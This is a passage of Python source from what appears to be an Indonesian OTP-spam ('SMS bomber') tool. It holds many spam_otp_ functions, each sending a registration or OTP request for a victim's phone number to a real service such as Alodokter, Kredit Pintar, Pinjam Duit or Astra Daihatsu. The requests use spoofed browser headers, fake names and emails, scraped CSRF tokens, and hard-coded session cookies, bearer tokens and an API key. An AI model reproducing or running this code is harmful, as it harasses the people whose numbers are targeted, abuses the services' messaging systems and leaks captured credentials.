            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'x-platform': "mobile-web",
            'x-member-token': "8cf04f4cf630b73e5ff81d6ec798a129da9a899fc2923afa1faf3cb943bb62ca",
            'authorization': "",
            'sec-ch-ua-platform': '"Android"',
            'x-request-time': str(int(time.time())),
            'accept-language': "id",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://m.misteraladin.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://m.misteraladin.com/account",
            'priority': "u=1, i",
            'Cookie': "_cfuvid=Y=NSmHE.f_IY=wf490spz3OaatNmaSPXSFaZSB72YWU-1780207406.1363122-1.0.1.1-xHMLbECgkrSfUPHWmHlqC0JUETysvOwDakcgDtG_EKQ; _ga=GA1.2.1474932703.1780207411; _gid=GA1.2.717120459.1780207411; _gat=1; _tt_enable_cookie=1; _ttp=01KSYA2RQQFR7BJFPHJ048FE3W_.tt.1; _gcl_au=1.2.433562123.1780207413; _ga_PLKRYTK7YG=GS2.2.s1780207412$o1$g1$t1780207413$j59$l0$h0; G_ENABLED_IDPS=google; ttcsid_C9BS9SBC77UC6ALAKSC0=1780207411986::L2HdYjCd4N7u-cdS8n4M.1.1780207444744.1; ttcsid=1780207411989::=-JmQwD98Wk95Gqtu2n9.1.1780207444744.0::1.1672.0::32685.10.375.365::0.0.0"
        }
        
        payload = {
            "phone_number_country_code": "62",
            "phone_number": nomor_lokal,
            "type": "register"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_paper(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://paper.id',
            'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Referer': 'https://paper.id/'
        }
        
        payload = {
            "phone": nomor_lokal,
            "method": "whatsapp",
            "registered_by": "flutter mweb"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        

        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success" or "otp" in str(data).lower():
                return True
            else:
                return False
        else:
            return False
            
     except Exception as e:
        return False
       
def spam_otp_planetban(nomor):
     try:

        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        elif nomor.startswith("+"):
            nomor_lokal = "0" + nomor[3:] if nomor.startswith("+62") else "0" + nomor[1:]
        elif nomor.startswith("0"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "0" + nomor
        
        import random
        import string
        random_name = f"User{random.randint(100,999)}"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        session = requests.Session()
        url = "https://api.planetban.com/website/customer/request-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://planetban.com',
            'Referer': 'https://planetban.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*'
        }
        
        payload = {
            "name": random_name,
            "phone": nomor_lokal,
            "password": random_password,
            "purpose": "register",
            "method": "whatsapp"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
       
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == True or data.get("success") == True or "success" in str(data).lower():
                return True
            else:
                return False
        else:
            return False
            
     except Exception as e:
        return False
      
def spam_otp_bunda(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bunda.co.id',
            'x-locale': 'id',
            'Referer': 'https://www.bunda.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone_number": int(nomor_lokal),
            "type": "auth"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_bonusbelanja(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com',
            'Referer': 'https://www.bonusbelanja.com/register/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": "User",
            "agreeTnc": True,
            "agreeContact": True
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_hijup(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.hijup.com/sign_in"
        
        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.hijup.com',
            'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'next-url': '/sign_in',
            'Referer': 'https://www.hijup.com/sign_in',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = f'[{{"phone_number":"{nomor_lokal}","store_path":"hijup"}}]'
        
        resp = session.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_alodokter(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        raw = nomor_lokal[1:] if nomor_lokal.startswith("0") else nomor_lokal
        
        import uuid
        uuid_val = str(uuid.uuid4())
        
        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "whatsapp"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_ohsome(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://ohsome.co.id/api/member/user/random_code_check"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://ohsome.co.id',
            'language': 'id',
            'deviceid': 'ba0a0027a5e6e7cde77f0f94f2572495',
            'x-store-no': 'SC001',
            'traceparent': '00-6bd858f4bdf14f53a8d3de8e6741641a-d542ee3bee82f7f4-01',
            'platform': 'H5',
            'tracestate': 'rum=v2&browser&j2e0xaqli6@901063bd0372204&df97461d6dea41e59bb8ad0ea28ef184&uid_had63ijdnpxyb93t',
            'Referer': 'https://ohsome.co.id/login',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "country_code": "62",
            "account": nomor_lokal,
            "type_id": 2,
            "device_id": "ba0a0027a5e6e7cde77f0f94f2572495",
            "check_code": str(random.randint(100000, 999999)),
            "image_id": "tcsRCTZ0RAvqQAvcUJDG"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_optikmelawai(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://api.optikmelawai.com/api/v3/auth/register/1"
        
        headers = {
            'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
            'x-unique-user': 'GA1.1.1062236172.1780823549',
            'language': 'id',
            'Origin': 'https://www.optikmelawai.com',
            'Referer': 'https://www.optikmelawai.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        data = {
            "phone_number": nomor_lokal,
            "name": "User",
            "email": f"user{random.randint(100000,999999)}@gmail.com",
            "password": "Test123",
            "password_confirmation": "Test123"
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_hollandbakery(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        session = requests.Session()
        url = "https://www.hollandbakery.co.id/resend-otp-register"
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.hollandbakery.co.id',
            'Referer': 'https://www.hollandbakery.co.id/users/verify_token',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        data = {
            "phone": nomor_lokal
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_hashmicro(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://website-api.hashmicro.com/api/add/3"
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.hashmicro.com',
            'Referer': 'https://www.hashmicro.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        data = {
            "phone_number": nomor_lokal,
            "name": "User",
            "email": f"user{random.randint(100000,999999)}@gmail.com"
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_tuneup(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://tuneup.id',
            'Referer': 'https://tuneup.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {"phone": nomor_lokal}
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_ultramilk(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://ultramilk-clp.kata.ai',
            'Referer': 'https://ultramilk-clp.kata.ai/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {"phone": nomor_lokal}
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_kaniva(nomor):
     try:
        if nomor.startswith("62"):
            lokal = "0" + nomor[2:]
        elif nomor.startswith("0"):
            lokal = nomor
        else:
            lokal = "0" + nomor
        
        names = ['Fahri', 'Budi', 'Andi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        name = random.choice(names)
        
        session = requests.Session()
        url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
        
        headers = {
            'Accept': 'text/html, application/xhtml+xml',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Inertia': 'true',
            'X-Inertia-Version': '56e6482206af61d5490c1118b2876044',
            'X-XSRF-TOKEN': 'eyJpdiI6InJmTFEzYkVZUHRNY1VXMHlDRTEyY0E9PSIsInZhbHVlIjoicW9maGwwN2JYR1FPNmNTV2RCOTFXZjJ1RVF1eGxJYVFwTVNMR25BMUN6cFh0bkJVeERmamM4VkR5STNRQ1BtRStqallFZDd3Y0hsd1ZFQUdTalFPSXJrWFliNTNiVldoMjRjNWQwcmdRVlNwQ1ZxcWVQdlZ1ajNubkovL0gybTYiLCJtYWMiOiIyOTljYzhmOWZlNjY3NzhjNGUyYzkxYmUyOTA1OGVjMzU3ZDdmZDhjMTk4OTMyNzllMDY2ZTQ0MDVmZWViMzcwIiwidGFnIjoiIn0=',
            'Referer': 'https://daftar.kanivainternationalbali.com/register',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "name": name,
            "phone": lokal
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
     except Exception as e:
        return False

def spam_otp_jembatani(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
        
        session = requests.Session()
        url = "https://api.jembatani.co.id/v1/register"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://jembatani.co.id',
            'Referer': 'https://jembatani.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "password": rand_pass
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_rcx(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
        
        session = requests.Session()
        url = "https://sso.rcx.co.id/auth/passwordless/request"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://sso.rcx.co.id',
            'Referer': 'https://sso.rcx.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "email": rand_email
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_sahabatteknisi(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.sahabatteknisi.co.id',
            'Referer': 'https://www.sahabatteknisi.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {"phone": nomor_lokal}
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_liva(nomor):
     try:

        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor


        device_id = str(uuid.uuid4())
        device_name = random.choice(['Samsung', 'Xiaomi', 'Realme', 'Oppo', 'Vivo', 'OnePlus'])

        url = 'https://cms-2f7gt694.liva-auto.id/api/public/auth-ada/send-otp'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-store',
            'content-type': 'application/json',
            'origin': 'https://liva-auto.id',
            'referer': 'https://liva-auto.id/',
            'user-agent': random.choice([
                'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36'
            ]),
            'x-app-version': '1.9.259',
            'x-device-id': device_id,
            'x-device-name': device_name,
            'x-platform': 'web'
        }
        payload = {
            'phoneNumber': nomor
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

     except Exception as e:
        return False

def spam_otp_daihatsu(nomor):
     try:

        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        session = requests.Session()
        resp_page = session.get(
            'https://www.astra-daihatsu.id/register',
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        import re
        csrf_match = re.search(r'CSRFToken.*?value=\"([^\"]+)\"', resp_page.text)
        if not csrf_match:
            return False
        csrf = csrf_match.group(1)

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/json; charset=UTF-8',
            'csrftoken': csrf,
            'origin': 'https://www.astra-daihatsu.id',
            'referer': 'https://www.astra-daihatsu.id/register',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }

        resp = session.post(
            'https://www.astra-daihatsu.id/otp/whatsapp/generate',
            json={'phoneNo': nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_kreditpintar(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        uuid_val = str(__import__('uuid').uuid4())
        session = requests.Session()
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://go.kreditpintar.com',
            'referer': f'https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-adv-market-channel': 'OfficialWebsite',
            'x-adv-uuid': uuid_val,
            'x-app-version': 'APPVERSION_NAME(9999)',
            'x-os-type': 'WEB',
            'x-user-agent': f'Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0'
        }

        resp = session.post(
            'https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id',
            json={'mobileNumber': nomor, 'type': 'SMS'},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_internetrakyat(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        session = requests.Session()
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://internetrakyat.id',
            'Referer': 'https://internetrakyat.id/auth/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-api-key': '280999!FTTH'
        }

        resp = session.post(
            'https://internetrakyat.id/api/app/auth/send-otp-register',
            json={'phone_number': nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_pinjamduit(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]


        session = requests.Session()
        BASE = 'https://api.pinjamduit.co.id'

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': BASE,
            'Referer': BASE + '/h5/download_selfmedia.html'
        }

        r1 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneWeb',
            headers=headers,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'uuid': str(uuid.uuid4()),
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res1 = r1.json()
        if res1.get('code') != '0':
            return False

        wybs = res1['data']['wybs']
        sms_useage = 10 if res1['data']['isExist'] == 1 else 0

        headers2 = headers.copy()
        headers2['ss'] = wybs

        r2 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneNext',
            headers=headers2,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'sms_service': 2,
                'sms_useage': sms_useage,
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res2 = r2.json()
        return res2.get('code') == '0'

     except Exception:
        return False

def spam_otp_isellershop(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://warungyeahbintan.isellershop.com',
            'referer': 'https://warungyeahbintan.isellershop.com/register',
            'x-requested-with': 'XMLHttpRequest',
            'x-sat': 'oCQ4sBq2nu1Bh9S3Vo7r8vImrDsZ+dvgZNzwSwJyCiI=',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        resp = requests.post(
            'https://warungyeahbintan.isellershop.com/services/identity/requestOTP',
            headers=headers,
            data={'destination': nomor, 'otpLength': '10'},
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_greensm(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            'HiringSource': 'Iklan di surat kabar atau dalam aplikasi',
            'Education': 's2',
            'WorkExperience': 'Sopir komersial',
            'City': 'BT',
            'Type': 'CAR_SHARING',
            'Tel': nomor,
            'Name': 'Budi Santoso',
            'Country': 'ID',
            'ReferralCode': '',
            'Source': '',
            'AffiliateNumber': '',
            'Campaign': ''
        }

        resp = requests.post(
            'https://gapi.indo.greensm.com/car/acquisition/create-registration',
            headers=headers,
            json=payload,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_tiptip(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        import uuid
        rid = str(uuid.uuid4())[:8]

        headers = {
            'accept': 'application/json',
            'channel': 'WEB',
            'channel-app-version': '2.27.6',
            'channel-device': 'Chrome',
            'channel-fingerprint': '19e4f5f07caab3x9k2-mn7pq4r1-7c34742a-6ddd0-19e4f5f07cbx9k2mn',
            'channel-fingerprint-additional': 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6',
            'content-type': 'application/json',
            'country-code': 'ID',
            'language': 'id',
            'request-id': rid,
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'origin': 'https://tiptip.id',
            'referer': 'https://tiptip.id/sign-up'
        }

        payload = {
            'action': 'SIGN_UP',
            'delivery_method': 'WA',
            'phone_number': nomor
        }

        resp = requests.post(
            'https://api.tiptip.id/authentication/guest/v1/phone/otp/send',
            headers=headers,
            json=payload,
            timeout=10
        )

        return resp.status_code == 200

     except Exception:
        return False

def spam_otp_dokterin(nomor):
     try:
        if nomor.startswith('62'):
            nomor_format = nomor
        elif nomor.startswith('0'):
            nomor_format = '62' + nomor[1:]
        else:
            nomor_format = '62' + nomor

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Origin': 'https://partner.dokterin.co.id',
            'Referer': 'https://partner.dokterin.co.id/',
